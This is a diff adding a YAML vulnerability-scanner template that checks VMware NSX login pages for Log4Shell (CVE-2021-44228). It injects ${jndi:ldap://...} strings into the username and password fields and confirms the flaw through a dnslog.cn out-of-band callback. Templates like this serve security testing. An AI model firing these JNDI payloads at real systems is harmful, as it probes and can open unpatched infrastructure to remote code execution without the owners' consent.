@@ -1,0 +1,42 @@
+name: VMware NSX Log4shell CVE-2021-44228
+manual: true
+query: ( title="VMware Appliance Management" | title="VMware NSX")
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: http://www.dnslog.cn/getdomain.php
+    expression: response.status == 200
+    output:
+      dnstest: response.body
+  r1:
+    request:
+      method: GET
+      path: /login.jsp
+    expression: response.status == 200
+  r2:
+    request:
+      method: POST
+      path: /login
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      body: username=${jndi:ldap://{{dnstest}}/tea}&password=${jndi:ldap://{{dnstest}}/lol}&submit=
+    expression: response.status >= 200
+  r3:
+    request:
+      method: GET
+      path: /login.jsp?login_error=1
+    expression: response.status == 200
+  r4:
+    request:
+      method: GET
+      path: http://www.dnslog.cn/getrecords.php
+    expression: response.status == 200 && response.body.bcontains(b"{{dnstest}}")
+expression: r0() && r1() && r2() && r3() && r4()
+detail:
+  author: aetkrad
+  links:
+  - https://github.com/aetkrad/goby_poc
+  description: VMware NSX 存在log4j漏洞。
+  tags: rce
